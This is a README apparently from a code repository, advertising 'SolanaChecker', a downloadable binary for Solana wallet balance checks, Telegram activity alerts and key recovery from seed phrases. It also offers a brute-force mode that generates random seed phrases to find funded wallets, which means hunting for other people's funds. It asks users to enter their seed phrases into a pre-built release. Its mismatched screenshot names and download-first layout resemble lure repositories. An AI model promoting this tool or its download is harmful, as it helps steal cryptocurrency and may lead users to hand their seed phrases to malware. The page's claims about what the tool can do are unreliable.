# Solana Wallet Activity Tracker: Stay Informed on Your Solana Transactions

Want to monitor the activity on your Solana wallets? **SolanaChecker** is your go-to solution for tracking transactions and staying informed about your SOL holdings. This powerful tool simplifies interactions with the Solana blockchain, providing you with critical features for efficient wallet management and real-time transaction monitoring.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/storage/image.webp" />
</p>

## Key Program Features

1.  **Solana Address Balance Checker:** Check the current balance on a specified address. Keep tabs on your funds with ease.

<p align="left">
    <img src="/storage/paste.webp" />
</p>

2.  **Token Security Assessment:** Evaluate the security of tokens based on their characteristics and metadata. Avoid potentially fraudulent investments and identify rug-pull risks.

<p align="left">
    <img src="/storage/terminal.webp" />
</p>

3.  **Solana Address Activity Tracking:** Receive real-time notifications via a Telegram bot about all activity on defined Solana addresses. Monitor your wallets effortlessly and stay on top of all transactions.

4.  **Wallet Data from Seed Phrase:** Retrieve your private key, address, and balance from your mnemonic (seed) phrase. Manage your wallets effectively.

<p align="left">
    <img src="/storage/close.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Create a new Solana wallet with a unique private key and address.

<p align="left">
    <img src="/storage/tooltip.webp" />
</p>

6.  **Brute-Force Wallet Generation & Balance Check:** Generate random seed phrases to search for wallets with a balance. Find potentially active wallets useful for research. Found wallets' data written to 'found-wallets.txt', and optionally, notifications are sent via Telegram.

<p align="left">
    <img src="/storage/tile.webp" />
</p>

## Telegram Notification Setup

To receive notifications in Telegram, insert your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) into the 'telegram-settings.txt' file, located in the program directory.

## Getting Started: Installation

Download a pre-built build from [Release](../../releases) or build the project yourself.

## Building the Project: Step-by-Step Instructions

The project is written in C++ and requires several dependencies. We recommend using **vcpkg** to handle these dependencies:

### Installing Dependencies with vcpkg:

1.  If you don’t already have it, clone the repository and install **vcpkg** by following the instructions on the [official page](https://github.com/microsoft/vcpkg).
2.  Add **vcpkg** to your system's PATH environment variable.
3.  Run the following commands to install the dependencies:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  After installing the dependencies, build the project.

### Building with Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure that **vcpkg** is correctly integrated. Follow the instructions for [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio).
3.  Click **Build** -> **Build Solution**.
4.  The executable will be in the `bin` folder.

### Building with Another C++ Compiler:

1.  Make sure that all dependencies are correctly installed via **vcpkg** and are accessible to your compiler.
2.  Compile the project using the following command (adjust as necessary):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Interface

Here's how to use the program from the command line:

1.  **-s / -search**: Start brute-force generation of seed phrases to find wallets with balances.
2.  **-t / -track (ADDRESS)**: Start tracking a specific address. The program will monitor activity.
3.  **-g / -gen (NUMBER)**: Generate the specified number of Solana wallets. Replace `<NUMBER>` with the number you desire.
4.  **-m / -mnemonic (MNEMONIC)**: View wallet info using the provided seed phrase. Replace `<MNEMONIC>` with the seed phrase.
5.  **-b / -balance (ADDRESS)**: Show the balance of a given address on the Solana network.

## Important Notes

-   The program is for research purposes and shouldn't be used for illegal activities.
-   Cryptocurrency investments involve risks. Always ensure the security of your data and wallets.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE). You're free to use, modify, and distribute the code according to the license terms.